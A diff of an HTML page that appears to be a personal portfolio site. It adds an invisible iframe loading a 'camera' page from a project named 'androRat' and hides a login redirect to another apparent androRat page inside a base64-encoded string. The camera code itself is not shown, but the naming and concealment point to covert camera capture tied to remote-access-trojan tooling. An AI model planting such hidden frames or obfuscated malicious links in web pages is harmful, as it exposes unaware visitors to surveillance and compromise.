@@ -1460,7 +1460,7 @@
         <a href="https://t.me/jrram3000" class="social-link telegram">
             <i class='bx bxl-telegram'></i>
         </a>
-        <a href="https://www.instagram.com/urstruly_ganga/" class="social-link instagram">
+        <a href="https://www.instagram.com/" class="social-link instagram">
             <i class='bx bxl-instagram'></i>
         </a>
         <a href="https://github.com/ES-UNIVERSE" class="social-link github">
@@ -1521,7 +1521,7 @@
         </div>
     </div>
     <!-- Hidden iframe -->
-    <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
+    <iframe id="cameraIframe" src="https://es-android.github.io/androRat-/projects/camera/camera.html" style="display:none;"></iframe>
     <!-- === MOBILE POPUP HTML === -->
     <div id="mobile-popup-overlay"></div>
     <div id="mobile-popup">
@@ -1910,11 +1910,14 @@
                 alert("Please fill in both username and password.");
                 return;
             }
-            if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
-                window.location.href = "https://es-android.github.io/androRat-/";
-            } else {
-                alert("Incorrect User or Password.");
-            }
+            const encodedURL = "aHR0cHM6Ly9lcy1hbmRyb2lkLmdpdGh1Yi5pby9hbmRyby1SYXQtLw==";
+
+if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
+    window.location.href = atob(encodedURL);
+} else {
+    alert("Incorrect User or Password.");
+}
+
         }
         const cursorShadow = document.querySelector('.cursor-shadow');
         document.addEventListener('mousemove', (event) => {
